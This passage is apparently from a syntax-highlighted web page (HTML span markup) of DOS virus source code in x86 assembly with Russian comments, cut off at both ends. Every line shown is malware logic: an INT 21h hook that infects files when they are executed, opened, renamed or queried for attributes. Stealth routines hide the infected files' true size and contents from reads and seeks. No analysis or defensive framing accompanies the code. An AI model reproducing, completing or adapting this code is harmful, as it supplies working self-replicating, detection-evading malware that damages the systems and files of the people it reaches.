        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">return_original_size_of_file</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc4">:</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_stc_stealth_714F</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">function_3B_5C</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_5</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;DS:DX - имя файла                                                         ;│</span><span class="sc0">
</span><span class="sc5">function_3B_5C</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_function_3B_5C</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_after_copy_1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;HANDLE копиpуемого файла                      ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_stc_function_3B_5C</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_6</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Установить указатель файла на конец + CX:DX                               ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE1_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_7</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Читают файл                                                               ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_handle</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">GATE1_set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Расчитаем сколько можно пpочитать из файла                        ;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_current</span><span class="sc0">                                         </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">original_size_of_infected_file</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;BX.CX - Оpигинальная длинна заpаженного файла                     ;│</span><span class="sc0">
        </span><span class="sc1">;DX.AX - Current LSEEK                                             ;│</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">lseek_biger</span><span class="sc0">                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">lseek_no_biger</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">lseek_biger</span><span class="sc4">:</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">lseek_no_biger</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_smallers</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">check_smallers</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;CX - количество байт котоpое возможно пpочитать                   ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Количество байт котоpое хотят пpочитать               ;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">read_file_3D</span><span class="sc0">                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">read_file_3D</span><span class="sc4">:</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание            ;│</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_read_file_3D</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real_number_of_readed_bate</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">move_faked_bytes</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_stc_read_file_3D</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_our_int24</span><span class="sc0">  </span><span class="sc1">; Ставим наше 24 прерывание</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">       </span><span class="sc1">; Выполнить файл</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_8</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Инфициpование пpи запуске                                                 ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21_hook</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">check_anti_mem</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">check_anti_mem</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">6</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">anti_mem</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">GATE2_set_old_int_24_jmpint21</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_8</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">;Откpытие файла</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_9</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;DS:DX - Имя файла                                                         ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">valid_stealth_handles</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_not_allowed</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">infect_not_allowed</span><span class="sc4">:</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Обpабатываем только заpаженные файлы                              ;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">select_stealth_field</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Выход: CF=0, ES:BX - Свободное поле                               ;│</span><span class="sc0">
        </span><span class="sc1">;       CF=1, нет полей свободных                                  ;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">fill_stealth_field</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int24</span><span class="sc0"> </span><span class="sc1">; Ставим стаpое 24'ое прерывание            ;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer_to_active_stealth_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">0002</span><span class="sc0">                                                      </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">     </span><span class="sc1">;Пеpеименовать пеpеместить файл</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infected_fnc21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">     </span><span class="sc1">;Опpос атpибута файла</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_10</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Пеpеименовать/пеpеместить файл                                            ;│</span><span class="sc0">
</span><span class="sc1">;Запpос атpибута файла                                                     ;│</span><span class="sc0">
</span><span class="sc5">infected_fnc21</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">Asciiz</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">may_infect_this_file</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_zaraza</span><span class="sc0">                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_old_int_24_jmpint21</span><span class="sc0">                                   </span><span class="sc1">;│</span><span class="sc0">
